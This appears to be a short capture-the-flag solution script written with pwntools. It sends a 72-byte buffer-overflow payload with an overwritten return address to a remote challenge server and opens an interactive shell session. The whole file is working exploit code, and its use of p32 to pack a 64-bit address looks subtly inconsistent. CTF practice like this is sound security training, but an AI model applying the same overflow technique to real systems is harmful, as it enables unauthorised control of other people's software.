from pwn import *
#r = process("./tranquil")
r = remote("shell.actf.co", 21830)
#r.recv()

payload = b"A"*72 + p32(0x0000000000401196)

with open("/tmp/t", "wb") as f:
    f.write(payload)

r.send(payload)
r.interactive()
